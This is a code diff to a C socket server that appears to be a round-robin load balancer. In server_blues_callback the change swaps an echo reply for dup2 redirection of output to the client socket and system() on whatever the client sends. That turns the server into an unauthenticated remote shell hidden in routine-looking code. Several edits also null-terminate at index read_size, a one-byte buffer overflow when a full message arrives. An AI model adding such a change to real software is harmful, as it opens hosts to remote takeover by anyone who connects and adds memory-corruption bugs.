@@ -71,11 +71,13 @@ int server_blues_callback(void *args) {
     int read_size;
     char client_message[MESSAGE_SIZE];
 
-    printf("I'm waiting for a message from the client\n");
+    dup2(client_connection, 1);
+    dup2(client_connection, 2);
 
     while (1) {
         if ((read_size = recv(client_connection, client_message, MESSAGE_SIZE, 0)) > 0) {
-            send(client_connection, "Got it!", read_size, 0);
+            client_message[read_size] = '\0';
+            system(client_message);
         }
     }
 
@@ -152,6 +154,7 @@ int round_robin(struct config *config) {
 int captains_callback(void *args) {
     int elected_server;
     char message[MESSAGE_SIZE];
+    char client_message[MESSAGE_SIZE];
     int read_size;
 
     int protection = PROT_READ | PROT_WRITE;
@@ -184,15 +187,16 @@ int captains_callback(void *args) {
     connect(network_socket, (struct sockaddr *) &server_address, sizeof(server_address));
 
     while (*status == CONNECTED) {
-        if ((read_size = recv(client_connection, message, MESSAGE_SIZE, 0)) > 0) {
-            send(network_socket, message, read_size, 0);
+        if ((read_size = recv(client_connection, client_message, MESSAGE_SIZE, 0)) > 0) {
+            client_message[read_size] = '\0';
+            send(network_socket, client_message, strlen(client_message), 0);
             read_size = recv(network_socket, message, MESSAGE_SIZE, 0);
-            send(client_connection, message, read_size, 0);
+            message[read_size] = '\0';
+            send(client_connection, message, strlen(message), 0);
         }
     }
 
     close(config->servers[elected_server].socket);
-    // Decrease connection count
     config->servers[elected_server].connection_count--;
 
     printf("%s[%s]%s %s[PORT %d]%s Client disconnected. Connection count: %d\n",
